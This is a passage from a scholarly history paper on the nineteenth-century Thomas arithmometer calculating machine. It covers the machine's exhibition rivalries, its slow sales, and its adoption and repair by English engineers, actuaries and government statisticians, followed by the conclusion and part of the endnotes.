a late arrival, too recent to be properly integrated into the topically arranged text, but still justifying a mention in the national account of Sweden and Norway. No details were given other than to report that it was a quite remarkable calculating machine.33\n\nThe machine was the Scheutz difference engine. Inspired by Babbage and carried through to completion with more limited means, the second version of the Scheutz engine had been brought to London in the autumn of 1854. A working machine which could automatically calculate and print mathematical tables by the method of differences, it received Babbage’s blessing and was taken to Paris in August 1855. Despite its late arrival, the machine and its impact were widely reported. A newspaper commented, ‘we do not believe that the Universal Exposition supplies a single machine where inventive genius is more completely revealed, than the calculating machine’ of Georg and Edvard Scheutz.34\n\nJury and journalist were largely at one: the Scheutzes received the accolade of a gold medal, leaving the arithmometer once again with no more than an honourable mention.35 The carefully staged struggle between the arithmometer and arithmaurel had become a diverting side show rather than the main event. The arithmometer’s claims as an elevated product of genius were dismissed when faced with the powers of the difference engine. A substantial review of the exhibition quickly dealt with the two French calculating rivals before moving on to the much more astonishing achievement of the Swedish engine. With its almost intelligent qualities and its ability to replace the work of learned savants by the handle-turning operations of an ordinary man, the difference engine seemed to open up a rhapsodic world of possibilities in which intellect was overtaken by mechanism.36\n\nHumbled once more, the arithmometer would nevertheless remain a regular entrant to subsequent exhibitions where it was duly reported and often rewarded. But never again would it be so carefully groomed for success, and yet so notably thwarted. While the exhibitions provided a dramatic public arena, their reports did however point to another dimension of the arithmometer’s public career. Beyond the realm of spectacle and rivalry the arithmometer’s performance as a commercial product was frequently noted. Here too the early news was not good.\n\nThe 1849 exhibition jury report remarked simply that the arithmometer had never entered into the commercial world, even though it could be delivered at a reasonable price. The situation was little changed by 1855 when the jury again recognised the machine’s potential to be modestly priced, even though it was as yet little known.37 By this time Thomas had distributed many examples of the arithmometer as presentation machines but he evidently expected that an increasing number of purchases would be made. Certainly, the 250 machines apparently assembled by 1854 would not all have been intended for Europe’s learned societies and royalty. But whether such completed machines had already been sold is uncertain. Apart from Moigno’s 1854 reference, the only other 19th-century source to quantify the arithmometer’s production is Sebert’s report of 1878 which records sales of 500 machines up until 1865, 300 for 1865-70, 400 for 1870-75 and finally 300 for 1875-78.38 Even by the late 1870s it would seem that no more than 100 arithmometers were being sold each year. The machine was far from being a successful object of mass production.\n\nAdvocates of the arithmometer sought to account for what they took to be its low rate of adoption and offered suggestions to expand its use. The most extended consideration of public responses to the machine was penned by the civil engineer G.-A. Hirn in 1863. Hirn offered the arithmometer as one of two inventions which had failed to achieve the public and commercial acclaim which he believed they merited (the other device was the hydrostat of Kaeppelin). His memoir was self-consciously presented as a case study in technological diffusion: having used the machine since 1855 and frequently demonstrated it to friends and colleagues he sought to document common reactions to the arithmometer and to identify and defuse the objections which he perceived as hindering its progress.39\n\nHirn records that after initial exclamations of wonder at the machine’s capacities, most observers first begin to doubt and then to criticise. Surely, as a machine, it must get out of order? Doesn’t it require more of an effort to learn than calculation with the pen? Won’t a user either lose the habit of calculation, or simply become mathematically lazy?40 Isn’t it restricted only to the four rules of arithmetic? How can it replace the slide rule, which has the advantage of portability?\n\nHirn offered practical reassurance and personal experience to allay anxieties about mechanical reliability and he presented the slide rule and the arithmometer as complementary devices, their particular strengths suited to distinct environments and calculating tasks.41 The balance of his paper was devoted to an exposition of advanced techniques which extended the arithmometer’s reach beyond the apparent restrictions of the four basic arithmetical rules.\n\nHowever, Hirn suggested that most of the doubts about the arithmometer hinged on one question which every onlooker always ended by asking: how much does the arithmometer cost? Hirn acknowledged that the answer typically frightened off most enquirers. However, Thomas was not creaming off excessive profits. Rather, the elevated price arose from the machine’s manufacture process. Currently constructed one by one using hand methods, Hirn considered that the price could be halved if the machine was manufactured in quantity using the mechanical techniques of a large workshop.42\n\nPrice had been identified from the outset as a crucial issue for the arithmometer. The very first report of 1821 had worried that the arithmometer would always be an expensive device. In 1854 it was identified as the only obstacle to the wider use of the machine.43 No systematic index of the arithmometer’s price has yet been constructed, and it would in any case be complicated by the variety of different models and capacities which were available from the 1850s onwards. However, fragmentary evidence does suggest that deliberate efforts were made to cut the price of the machine.44\n\nUsers and uses: the example of England\n\nThe evidence of reports, exhibitions and contemporary comment suggests that sustained production of the arithmometer – either individually or in small batches – first began seriously in about 1850. The machine was not an overnight success. Frequently outshone in public by its rivals, it was sold at a rate of no more than 100 a year before the 1880s. The fragility of the machine’s identity and market both puzzled and disturbed advocates such as Hirn. Hirn’s memoir offered an analysis of the perceived obstacles to the diffusion of the arithmometer, much in the manner of more recent economic historians and market researchers. Can the historian do more? Even if impressionistic, Hirn had the advantage of witnessing and reporting directly on the reactions of contemporaries. Nevertheless there are sources which can complement his picture and which enable us to move from a model of passive diffusion to consider the ways in which the arithmometer was actively appropriated and adopted by users. We need to take this route if we are to understand how a device apparently so beset by problems not only survived but became the foundation for an industry. Focusing on users and their diverse uses of the machine helps to recast the problem, transforming it from the negative [page 17:] terms of ‘resistance to innovation’ and towards a more productive investigation of how the arithmometer came to figure reliably in the calculating routines of human ‘computers’.\n\nThe first report for the Société d’encouragement in 1821 noted that Thomas envisaged his machine primarily as a tool for large commercial organisations or banks. He apparently imagined that it ‘ought to render important services in counting houses, banks, exchanges, and every place where frequent and rapid calculations are necessary.’45 Doubtless this vision of the potential market was conditioned by Thomas’s own experiences both as an army administrator with the French forces in Spain and Portugal and as director of the Phénix insurance company from 1819.46\n\nHowever, the exhibition reports from the 1840s and ’50s repeatedly state that the machine was not established in the commercial realm. An indication of some of the early French institutional users is given in an instruction manual of 1865 which cites the Western and Northern railways as well as the Caisse des consignations and the Creusot works.47 A post-1865 promotional leaflet suggests the expansion of the targeted market beyond commerce and finance through its references to astronomy, geometry, architecture and industry.48\n\nIn the 1850s the arithmometer was principally available from the offices of the Soleil insurance company in Paris, of which Thomas was general director. However, by at least the 1860s, agents were being appointed outside France. Exports were claimed to account for 50% of production in 1862 and 60% in 1878.49\n\nIn Germany, the arithmometer had been referred to as early as 1823,50 and its revised form was publicised in an 1862 booklet by Franz Reuleaux.51 Early satisfied purchasers included the Preussische statistische Büro, which bought its first machine in 1864 and another larger one the following year. Further pairs of machines were added in both 1878 and 1879.52 The first evidence of interest from the United States likewise comes from the 1860s and ’70s.53\n\nThe national example I want to focus on is, however, that of England, principally for the pragmatic reason of access to archives and sources. The arithmometer was known in England at least as early as its 1851 appearance at the Great Exhibition. As well as his support in the pages of Cosmos and despite his faltering command of English, the abbé Moigno demonstrated an example at the 1854 meeting of the British Association.54 Although it is clear that a few arithmetical adventurers purchased machines in the 1850s,55 it is primarily for the 1860s and later that we have detailed evidence of the use of the arithmometer.\n\nA London-produced promotional leaflet provides one of the most vivid windows onto the arithmometer’s use in England. After describing the machine and noting its exhibition awards – most recently at Moscow in 1872 – the leaflet prints a list of the machine’s users. A total of 33 corporate bodies, from government departments to colleges, observatories and insurance companies, are included, followed by 40 individuals and firms representing engineers, bankers, actuaries, doctors and chemists.56 The 1872 list was evidently intended to demonstrate that the arithmometer had already arrived, and that it was well-established in a wide range of professional pursuits. But by naming a series of exemplary owners in order to persuade prospective customers this leaflet provides a point of entry to a rich network of users.\n\nThe 1872 list names ‘Mr. Brunel, C.E., Westminster’, who can be readily identified as the engineer Henry Brunel – son of Isambard Kingdom Brunel. In March 1866 Brunel wrote to a correspondent:\n\nI have just got what my mother irreverently calls ‘a new toy’ – to wit a calculating machine price £12 which does all the common operations of arithmetic viz addition, multiplication, subtraction & division in the twinkling of an eye. It is really a very useful article worth its weight in brass.57\n\nLater the same month, the machine – still described as ‘very useful’ and now identified as French – was recommended to another correspondent.58 From a subsequent letter it appears that Brunel’s machine had been ordered for him by his engineer colleague William Froude,59 and it was to Froude that Brunel reported in May of ‘the grand use of my calc. machine this afternoon getting out some quantities’. The context of the letter suggests that Brunel sought arithmetical aid as he worked on a tunnelling machine scheme for the proposed Channel Tunnel.60\n\nConfirmation that Brunel’s calculating machine was indeed the arithmometer and that it was treated as more than just a passing novelty comes in the following year. Brunel had evidently persuaded Froude to take a closer look at was presumably a new model and had asked Thomas’s London agent to make the ‘Arithmetic Machine’ available. That the service may have been performed before, though not entirely to Brunel’s satisfaction, is suggested by his afterthought: ‘Please make sure that the key of the box is sent with it.’61 If Froude had not actually bought the machine previously, Brunel’s enthusiasm was infectious: Froude’s name also appears on the 1872 list of the arithmometer’s purchasers.\n\nBy 1868 Brunel had learnt to call the machine an arithmometer and was ordering another example. He immediately reported his acquisition in terms which suggest both his intimate familiarity with the machine and also the way in which its capacity and power had become a matter of friendly rivalry: ‘I have a £20 Calc: Machine as big as Clarke’s with a fizzer for the little beggars’.62 As the more prosaic language of the order makes clear, Brunel’s ‘fizzer’ was the eraser knob and mechanism for the small quotient dials, introduced in 1865.63\n\nThe evidence of Brunel’s correspondence indicates how, beneath the outward face of anonymous market phenomena and purchase decisions, personal friendships and recommendations were vital in fostering the commercial success of the arithmometer. Moreover, his enthusiastic efforts help us to rethink the character of the machine’s ‘diffusion’. Brunel demonstrates the extent to which users were more than mere passive vectors for the spread of an unchanging object. Writing to the agent in 1868 to enclose his delayed payment, Brunel listed four faults in the machine which could be remedied without great trouble. The last of them – concerning the operation of the setting sliders – was simple to correct at the manufacturing stage but troublesome afterwards and had afflicted the four most recent of the five machines bought by Brunel and his friends.64\n\nBrunel’s suggestions were not warmly received. Writing from Froude’s in March 1869 he remarked that ‘I now get my Arithmometers through Adie my Instrument Maker as the regular agent did not take pains to serve me well’. Bypassing the agent, Brunel got Adie to buy directly from Paris and then to make alterations according to his preferred pattern, as well as adding a leather carrying case. By this stage Brunel was acting as an intermediary himself, obtaining his ‘improved’ arithmometers through Adie and then sending new machines to friends while also receiving damaged or worn examples for repair. It should perhaps be no surprise that Hawkshaw and Noble, two of the engineers with whom Brunel carried on his traffic in arithmometers, also appear in the 1872 list of purchasers.65\n\nIn addressing problems with his friends’ machines, Brunel was led into highly detailed examinations of their mechanisms. Mechanical defects which jammed the machine could be diagnosed and repaired but more worrying were instances when the machine was found to be giving the wrong results. Errors of this kind undermined the trust on which regular operation was founded. Brunel therefore went to great lengths to identify the sources of such subtly unsettling faults. In one instance, with the help of diagrams and much explanation, he tracked down a problem to wear and tear in the carrying mechanism, but only when the carriage was in one particular position.66 Such faults could have cast a long shadow over the reliability of the arithmometer among isolated users but, by capturing the fault, devising a remedy and passing it on to correspondents, Brunel helped to keep the machine above the level of unrecoverable suspicion. In doing so he helped to build up a repertoire of cautions, tricks and fixes well beyond the more anodyne recommendations of the official instruction manuals.\n\nHenry Brunel enables us to recover the network of active interest through which the arithmometer’s engineering trajectory was accomplished. While the purchase of other machines can be documented, in the present state of research it often remains difficult to identify particular motivations. For example, the 1872 list includes the South Kensington Museum; the corresponding machine, purchased in 1868 and marked for the Science and Art Department, survives in the Science Museum, London.67\n\nOther personal connections are occasionally hinted at. Both the Cambridge Observatory and Professor Bashforth appear in the 1872 list. John Couch Adams, director of the Cambridge Observatory from 1861, is reported to have remarked that an arithmometer was ‘in constant use there in the observatory, and that [page 18:] it is most valuable in shortening the tedious processes of astronomical calculations’.68 Bashforth was second wrangler at Cambridge in 1843 when Adams was senior wrangler and they became close associates, collaborating on a treatise on capillary action as late as 1883. However, after his appointment as professor of applied mathematics at Woolwich in 1864, Bashforth’s primary interest lay in ballistics. In reducing the results of experiments with his chronograph and in calculating ballistic tables, Bashforth relied on the arithmometer as ‘a most valuable assistant’.69\n\nOne of the most prominent areas in which the arithmometer came into use in England was in insurance. Actuaries were probably the first professional group to adopt it and adapt their work to its capabilities. From the 1860s there was a steady stream of articles showing how the specialised and repetitive calculations required to construct actuarial tables could be reworked to take advantage of features of the arithmometer. More than just exposition, there was also active debate about the merits of machine calculation.70 The 1872 list illustrates the extent to which insurance companies were not just considering the possibility of adopting arithmometers but were already making their purchases. A total of 17 offices had already bought machines from the London agent. Nor do such references necessarily represent only a single machine. Among those listed was the Prudential, which underwent dramatic expansion from the mid-1860s as it pioneered mass ‘industrial insurance’ beyond the socially elevated market to which companies had largely restricted themselves. The company’s investment in, and reliance on, the arithmometer spiralled as its business grew. Aside from daily calculation, the arithmometers were put to work when the company fulfilled its legal obligation to conduct quinquennial valuations of every policy. The 1877 valuation took 300 clerks 6 months to complete and it was reckoned that, with about 2.5 million policies in force, 4,635,894 calculations were carried out. The Prudential’s Henry Harben recorded that ‘We had 24 arithmometers at work on the business, and without them it would have been impossible.’71\n\nEssential as the arithmometer was becoming to the Prudential’s business, the machine could not be treated as a fully reliable resource. The company’s archives preserve a few fragmentary but revealing records of repair work carried out on their arithmometers during the 1870s. Springs would snap and other more serious mechanical defects were not uncommon. The effort of the quinquennial valuation severely tested the machines’ robustness: in one month alone in 1877 12 machines required attention for one or more repairs.72 To guard against the dangers of both operator and mechanical error, the Prudential typically carried out its calculations in parallel, using one machine to check the results of another.73 But the company was so concerned with guaranteeing reliability that it sponsored the development of an English version of the arithmometer in the hope of obtaining improved performance. An 1879 letter to The Times announced ‘a premium of £300 in addition to the full price of 20 perfect English-made machines’. When the prize was paid in January 1882, £200 went to the instrument makers Elliott Brothers.74\n\nThe Prudential’s initiative was evidently born of frustration at the perceived inadequacies of a device that they could no longer do without, a device they had built into their administrative procedures. Henry Brunel’s response to his similar experience had been to commission his regular instrument maker to carry out alterations. But government departments also faced the same problems with which commercial bodies and individual engineers were struggling.\n\nIn the history of computing the General Register Office (GRO), Britain’s centre for official statistics, is known for commissioning the third Scheutz difference engine, manufactured by Bryan Donkin & Co. and delivered in 1859.75 Although this machine assisted in the calculation and printing of William Farr’s English Life Table (1864), it was afterwards decommissioned and placed in storage. The GRO turned away from the ambitions of the difference engine to the more limited means of the arithmometer.\n\nTreasury letters record the GRO’s purchase of arithmometers in 1870, 1872, 1873 and 1877 and, although the utility of the machine was repeatedly reported and endorsed, qualifications were entered from the beginning. The first letter seeking authorisation for purchase asked not for the price of the machine (£20) but for £25: ‘some improvements have been suggested after trial and experience in this Department, which may cost perhaps some two or three pounds additional’.76 Like Brunel, and perhaps because of his example, custom alterations were seen to be necessary before delivery. Such improvements were not however enough to render the machines fault-free, and running repairs were still required. Although it was ultimately left to the Prudential’s private initiative, the GRO considered the same chauvinistic solution later sponsored by the insurance company. Responding to Treasury enquiries, the GRO took the view that ‘the liability of “Arithmometers” to get out of order and their noise would be greatly diminished if they were made by more accurate and better workmen - perhaps Englishmen’.77\n\nThe Treasury did not however resort to offering English incentives but hoped to prevail upon the current manufacturer. Having received another report in 1873 from Sir Francis (later Lord) Sandford on a machine supplied to the Education Department, the Treasury suggested that Sandford and the GRO should together ‘communicate with the Inventor of the “Arithmometer” in order to ascertain if improvements could not be introduced in the construction of these machines’.78 Thomas had died in 1870 and English government efforts to encourage new developments met with no more success than Brunel’s. Four years later the GRO addressed the need for improvements in the machine: ‘this has been frequently represented to the manufacturers in France and to their Agents in this Country, but the reply is that the demand for them is so limited that no alteration can be made in them; consequently they frequently require repairs.’79 This remarkably telling comment indicates that the machine was offered as being ‘good enough’; despite the importunities of unruly English users the arithmometer’s manufacturers did not think that it merited further investment and development.\n\nThe introduction of an English-made arithmometer in the 1880s was evidently meant to capitalise on the dissatisfied sentiments of English users of the Thomas machine. Later GRO documents show how the comparison between the Thomas arithmometer and its English competitor was analysed, playing off cost against long-term reliability.80 But rather than continuing with this story and highlighting the frailties of the arithmometer I want to conclude my account of English users by returning to the early 1870s.\n\nThe 1872 list of purchasers brings together companies and individuals from many fields. I have shown how engineers, astronomers, actuaries and statisticians engaged with the machine, celebrating its utility and actively probing its weaknesses. Was the juxtaposition of these different intellectual and professional roles merely an artefact of a promotional leaflet? Did the arithmometer move along parallel but distinct tracks in the professionalising world of later 19th century England?\n\nA meeting of the Society of Telegraph Engineers in April 1872 suggests that the links among advocates and users of the arithmometer were not constrained by disciplinary or professional boundaries. The Society gathered to hear a paper on ‘the application of the calculating machine of M. Thomas de Colmar to electrical computations’ by Thomas T.P. Bruce Warren. The paper reveals the extent to which Warren had taken his cue from recent accounts of the actuarial use of the arithmometer; actuaries had pointed the way in showing how calculating procedures should be reworked in order to benefit from the capabilities of the machine. Perhaps even more significant is the printed discussion which follows the published version of the paper.81 The contributing audience did not consist of a narrowly bounded group of telegraph engineers, or indeed electricians defined more broadly. General Hannyngton of the India Office, one of the prime actuarial proponents of the arithmometer, was present and his views were supplemented by those of Henry Harben, the secretary of the Prudential. Another actuary to speak up was Peter Gray and comments also came from Dr Royston Piggott F.R.S. All of these figures and their institutions are recorded in the 1872 list. The discussion ranged from electrical work through actuarial experience to trigonometrical and surveying issues, as well as the handling and maintenance of the machine.\n\nThe judgement of Siemens, the Society’s President, captures the effect of this informed cross-disciplinary audience in persuading new users of the arithmometer’s potential. Siemens confessed that he had initially had doubts about the suitability of the arithmometer as a topic for his society’s meeting. ‘But the more he had seen and heard about it, the more he was satisfied the subject was one of great interest to Telegraph Engineers; they had so much to do with calculations of an intricate kind.’ [page 19:]\n\nConclusion\n\nI began by citing a widely-held view of the arithmometer as the first commercially manufactured calculating machine. While my account casts doubt on less cautious claims (such that it was the first mass-produced calculator),82 that initial general statement remains intact as a concise caption for the arithmometer – though only for the developed form available towards the end of Thomas’s long life. Thomas’s business success in insurance meant that the low rate of machine production and its apparent lack of profit were not problems which need have troubled him.83 On the contrary, Thomas advertised his extraordinary investment. In his promotional book of 1855, Jacomy-Régnier announced that Thomas had spent 300,000 francs on developing the arithmometer, setting that figure against Leibniz’s reputed costs of 100,000 francs and Babbage’s notorious government subvention of £17,000 (reckoned as equivalent to 425,000 francs).84 If we are to label Thomas’s work on the arithmometer, it is more likely to fall within the category of vanity publishing than mass production.\n\nThe burden of this paper has been to examine the lengthy and complex process by which the arithmometer’s eventual success was achieved – if indeed the process was ever completed. At the end of my period, in the late 1870s, it is clear that the arithmometer occupied an increasingly established and tangible calculating niche but, while its usefulness was praised, a search was already underway for a superior replacement. The perceived need for an alternative was taken as a symptom of the arithmometer’s inadequacies, but the assumption that the desired replacement should be functionally (and even visually) identical can equally be interpreted as a mark of the machine’s success.\n\nClearly it is not enough to date the arithmometer to 1820 and then interpret its subsequent history as simply a question of diffusion. The mechanical and public identity of the machine was worked and reworked, and its users adapted not just their own computing work but altered the machine itself. These three elements – the machine’s development as a mechanism, its public evaluation and reputation, and the activities of its users – do not exhaust the history of the arithmometer: the details of its manufacture, for example, are still largely obscure. Nevertheless, only by jointly attending to the diverse elements of the arithmometer’s persona can we can begin to grasp the machine’s career, from fragile prototype to de facto standard.\n\nAcknowledgements\n\nI would like to thank the Scientific Instrument Society for supporting this work with a research grant. Many individuals – too many to list here – have helped by supplying information on individual machines or allowing access to their collections. Particular thanks are due to Michel Bardel, Paolo Brenni, Dominique Brieux, Judit Brody, Friedrich Kistermann, Doron Swade, Peter Traynor and Geoffrey Tudor. I would especially like to thank Robert Otnes for prompting me to begin this work many years ago and for his generosity in subsequently passing on the results of his own research.\n\nStephen Johnston\nMuseum of the History of Science\nBroad Street\nOxford OX1 3AZ\nstephen.johnston@hsm.ox.ac.uk\n\nNotes\n\n1. See, respectively, D. Baxandall and Jane Pugh, Calculating Machines and Instruments: Catalogue of the Collections in the Science Museum (London, 1975), p. 11, Uta C. Merzbach, Georg Scheutz and the First Printing Calculator (Washington, 1977), p. 37 and Michael Lindgren, Glory and Failure: the Difference Engines of Johann Müller, Charles Babbage and Georg and Edvard Scheutz (Cambridge, Mass., 1990), p. 290. For further references, among many others, note Michael R. Williams, ‘Early calculation’, in William Aspray (ed.), Computing before Computers (Ames, 1990), p. 50 and Gerard L’E. Turner, Nineteenth-Century Scientific Instruments (London, 1983), p. 283.\n2. Jean Marguin, Histoire des instruments et machines à calculer (Paris, 1994), pp. 83-9.\n3. Published in the Bulletin de la Sociéte d’encouragement pour l’industrie nationale (hereafter Bulletin). For this and other arithmometer articles from the Bulletin I cite page numbers from the reprinted versions published in celebration of the machine’s centenary in 1920, while also giving the year of first publication. The report by Sebert was dated 13 December 1878, Bulletin (1879/1920), 694-720, p. 707. The centenary issue of the Bulletin was the major source for Ernst Martin’s account of the arithmometer in The Calculating Machines (Die Rechenmaschinen): their History and Development, trans. and ed. by Peggy Aldrich Kidwell and Michael R. Williams, Charles Babbage Institute Reprint Series for the History of Computing, 16 (Cambridge, Mass., 1992), pp. 53-7.\n4. Hartmut Petzold, Rechnende Maschinen: eine historische Untersuchung ihrer Herstellung und Andwendung vom Kaiserreich bis zur Bundesrepublik, Technikgeschichte in Einzeldarstellungen, 41 (Düsseldorf, 1985), p. 102. For the English machines of Tate and Edmondson see Baxandall and Pugh (note 1), p. 12.\n5. Patent no. 1420, 18 November 1820. Thomas’s letter of request to the Minister of the Interior, dated 6 October 1820, is reproduced in J. Joly, ‘Un grand inventeur alsacien: Charles-Xavier Thomas’, La Vie en Alsace, p. 132. This article is the most authoritative biographical source on Thomas and a copy was kindly supplied by Friedrich Kistermann. I have not yet verified the date of the article but it must have appeared in the Strasbourg periodical in 1935 or shortly afterwards, when a monument to Thomas was erected in Colmar (see Maurice d’Ocagne, ‘Thomas de Colmar, inventeur de l’arithmomètre’, Revue scientifique, 73 (1935), 783-5).\n6. The arithmometer was first examined by Bréguet and Francoeur, and Francoeur’s report of 26 December 1821 is Bulletin (1822/1920), 660-2. The subsequent memoir by Hoyau is ibid., 662-70.\n7. NMAH, Washington, inv. 326,649. This machine, or one very like it, was exhibited by Darras, the then manufacturer of the Thomas arithmometer, in the 1920 exhibition celebrating the centenary of the arithmometer: see Bulletin (1920), pp. 620-1.\n8. On Devrine, G.H Baillie, Watchmakers and Clockmakers of the World, 3rd ed. (London, 1951/1966), p. 84 lists him as Paris, 1824, though Tardy, Dictionnaire des horlogers français, part 1 (Paris, 1971), p. 184 gives only a later reference to a Devrine at the Galerie Vivienne in 1870. Devrine also made instruments: the Musée des Arts et Métiers has a balance bought from him in 1809 (inv. 168). The existence of this machine, and Devrine’s role in its manufacture, creates a problem for any attempt to identify the early arithmometer as a radical break with the past. Cf. Annegret Kehrbaum and Bernhard Korte, Calculi: Bilder des Rechnens einst und heute/Images of Computing in Olden and Modern Times (Opladen, 1995): ‘Thomas’s machine also inaugurated a new epoch in the technical production of calculating machines. In the past practically all calculating machines had been made by watchmakers ...’ (p. 70). To further reinforce the point, note that d’Ocagne (note 5, p. 785) states that Thomas was initially helped by Piolaine, ‘un jeune ouvrier horloger de Neuilly-sur-Seine’. I have been unable to confirm this independently, but note that Tardy (part 2 (Paris, 1972), p. 523) lists a member of the Piolaine family at Neuilly-sur-Seine in 1838 and Baillie has Piolaine fils at Paris in 1825 (p. 253). (Note added 24 March 2005: an article in L'Illustration of 20 October 1849 provides the evidence for Piolaine’s involvement. Piolaine, described as ‘un jeune homme ... fils d’un horloger de Neuilly’, was working on a new machine when he died unexpectedly in 1848. See either an extract of the article, or a scan of the full text.)\n9. The circular design of the patent’s multiplicateur recalls Leibniz’s machine. Although often considered to have been lost to view for almost 200 years, images of Leibniz’s calculating machine were available in the 18th century; see the 1744 engraving in Kehrbaum and Korte (note 8), p. 61.\n10. Instruction pour se servir de l’arithmomètre (Paris, 1852; facsimile edition by Alain Brieux, Paris, 1982), preface, p. 2. The claim was accepted and promoted. The abbé Moigno, Cosmos, 4 (1854), p. 76 writes extravagantly and implausibly of Thomas ‘qui, depuis trente ans, n’avait pas cessé un seul instant d’améliorer son oeuvre’. Equally, the contemporary report in the Comptes Rendus Hebdomadaires des Séances de l’Académie des Sciences, 39 (1854), 1117-24, p. 1123, writes that ‘Quant à l’arithmomètre, qui ne se trouve pas encore dans le commerce, c’est avec le plus honorable désintéressement que, depuis trente ans, M. Thomas n’a cessé de le perfectionner pour le rendre utile, de simplifier pour qu’il pût être livré à un prix modéré’.\n11. See Joly (note 5) and note that Thomas’s name features repeatedly in P.J. Richard, Histoire des institutions d’assurance en France (Paris, 1956).\n12. For 1844, [Exposition des produits de l’industrie française en 1844], Rapport du jury central (Paris 1844), II, p. 504. A machine dated 1848, again the property of Darras, was displayed at the arithmometer centenary exhibition (note 7), pp. 620, 622. What was presumably the same machine was offered at Drouot-Richelieu, Paris, 17 November 1995, lot 124; its present whereabouts are unknown. [page 20:]\n13. Patent no. 6261, 8 December 1850; addition, 19 August 1851. An English patent to the same effect was taken out in 1851, no. 13,504.\n14. Cf. Bulletin, 51 (1852), p. 615.\n15. An 1851 report for the Société d’encouragement by Benoît remarks in a footnote that, without expanding the size of the arithmometer, it should be possible for the machine to record quotients on special dials: Bulletin (1851/1920), p. 691. The addition to the 1850 patent (note 13), filed a few months after Benoît’s report, suggests a complex mechanism for recording quotients which never seems to have been implemented. Note that a machine of c. 1851 in the Musée des Arts et Métiers, Paris (inv. 40571) has a series of independent dials on the setting plate, without any mechanical connection, on which partial quotients could have been manually inserted.\n16. Sebert (note 3), p. 703. Note however that the 1855 exhibition machine discussed below already had quotient dials.\n17. Francoeur (note 6), p. 661, Comptes Rendus (note 10), p. 1120, Sebert (note 3), p. 698.\n\n18. For example, Rapport du jury central sur les produits de l’agriculture et de l’industrie exposés en 1849 (Paris, 1851), II, 549-1, p. 550.\n19. Comptes Rendus (note 10) and ibid., 38 (1854), p. 315. Thomas also attempted to enter the arithmometer for the Académie’s prix de mécanique in this year but the entry was deferred until 1855: ibid., 39 (1854), p. 1221. The machine, with an engraved dedication to the Académie, survives in the Musée des Arts et Métiers, inv. 7479.\n\n20. Marguin (note 2), p. 111: ‘Pendant un demi-siècle, la machine y régna seule.’\n21. For Thomas and Roth at the 1844 exhibition, see the jury report (note 12), II, pp. 503-4. The catalogue of the Bibliothèque Nationale lists Roth’s published leaflets on his adding machine. The report on Roth’s adding machines and counters appeared, along with a historical classification of calculating devices, in Bulletin (1843/1920), 673-84. The exhibition guide mentioning Roth is Jules Burat, Exposition de l’industrie française année 1844. Description méthodique, 2 vols (Paris, n.d.), I, pp. 60-2. Roth (whose first name is also given as David) appears in Marguin (note 2), which illustrates both his adding and his (unfinished) calculating machines (pp. 114-7).\n22. See note 18.\n23. [Exhibition of the Works of Industry of All Nations, 1851], Reports by the Juries (London, 1852), p. 310. Illustrated London News, Exhibition Supplement, 20 September 1851, pp. 354-5.\n24. An 1850-style example dedicated to Marie-Thérèse Louise de Bourbon, regent of the duchies of Parma and Plaisance, was offered at Drouot-Richelieu, Paris, 10 May 1990, lot 114. Another presentation machine, probably from after 1852 judging by the form of the add/subtract switch, is in the Heinz Nixdorf MuseumsForum, Paderborn, inv. no. E-1994-681. A more modest level of decoration was reserved for personal presentations rather than those destined for the crowned heads of Europe; see the example dated 22 July 1852 and dedicated to Mme Zenoïde de Jacquemain, ‘souvenir affectueux de l’Inventeur’ (Museon, The Hague, inv. 9006; http://museon.museon.nl/objecten/567.htm). Presentation examples were still being offered after Thomas’s death by his son: see Bulletin (1920), p. 625 for the machine offered to the emperor of Brasil in 1872 by Thomas de Bojano.\n\n25. Thomas had been created Chevalier of the Légion d’Honneur in 1821, for his military service rather than the arithmometer (Joly, note 5, p. 131).\n26. For an account stressing the industrial character of the arithmometer and contrasting it with impractical earlier machines destined only for the collections of princes and nobles, see Kehrbaum and Korte (note 8), pp. 70, 64.\n\n27. On the arithmaurel, see Lalanne in Annales des Ponts et Chaussées, 3rd ser., 8 (1854), 2nd trimestre, pp. 287-310. Lemoyne’s report on the arithmometer directly follows at pp. 311-332; its reference to Maurel and Jayet comes at the end of a historical review on p. 328.\n28. F. Moigno, ‘Arithmomètre ou machine à calcul’, Cosmos, 4 (1854), 72-9. A descriptive account of the arithmometer also appeared in a subsequent number of Cosmos: 4 (1854), 186-96. Moigno was one of the leading vulgarisateurs of science, emphasising spectacle and controversy rather than ‘normal science’; see Susan Sheets-Pyenson, ‘Popular science periodicals in Paris and London: the emergence of a low scientific culture, 1820-1875’, Annals of Science, 42 (1985), 549-72, pp. 556-7.\n29. Robert Fox, ‘Edison et la presse française à l’exposition internationale d’électricité de 1881’, in his Science, Industry, and the Social Order in Post-Revolutionary France (Aldershot, 1995) has shown how big business interests were able to buy influence and favourable press coverage on a massive scale at the electricity exhibition of 1881. Thomas may have pursued similar tactics, but on a much smaller scale.\n30. Cosmos, 4 (1854), p. 77.\n31. The machine remained with the firm and is listed in a 1915 inventory of materials and machines drawn up for Darras: ‘Grande machine à calculer d’Exposition 1855 dans son grand meuble en bois noir incrusté et garni de cuivre fabriquée par M. Thomas de Colmar. Prix réduit convenu 1.000 [francs]’ (inventory copy in Mathematics Files, National Museum of American History, Washington). Darras exhibited the machine at the 1920 exhibition, Bulletin (1920), pp. 621, 623. It is now in the collection of IBM: A Calculator Chronicle: 300 Years of Counting and Reckoning Tools (Armonk, n.d.), pp. 14-15.\n32. Cosmos, 5 (1854), p. 663.\n33. H. Tresca (ed.), Visite à l’Exposition Universelle de Paris, en 1855 (Paris, 1855), p. 353 (arithmometer and arithmaurel) and p. 25 (Swedish machine).\n34. On the Scheutz engine, see Lindgren (note 1). The engine’s year-long stay in Paris is discussed on pp. 193-203 and the newspaper citation is on p. 196.\n35. [Exposition Universelle de 1855], Rapports du jury mixte international (Paris, 1856), p. 405.\n36. Léon Brisse, Album de l’Exposition Universelle, 3 vols (Paris, 1856-9), II, p. 194.\n37. Rapport (note 18) II, p. 551 and Rapports (note 35), p. 405.\n38. Sebert (note 3), p. 704. Sebert’s figures have provided the primary foundation for the few existing analyses of factors affecting the production and adoption of the arithmometer. See Ludolf von Mackensen, ‘Bedingungen für den technischen Fortschritt: dargestellt anhand der Entwicklung und ersten Verwertung der Rechenmaschinenerfindung im 19. Jahrhundert’, Technikgeschichte, 36 (1969), 89-102 and F.W. Kistermann, ‘The slow acceptance of mechanical calculating machines – some reflections and remarks’, Proceedings of the Cultural History of Mathematics, 6 (1996), 32-43. The only independent way of assessing the reliability of the data of Sebert and Moigno is by studying surviving machines and their serial numbering system. Preliminary indications suggest that Sebert’s figures tally reasonably well with machine serial numbers. What is not yet clear is whether the serial numbers provide a reliable guide to the number of machines actually 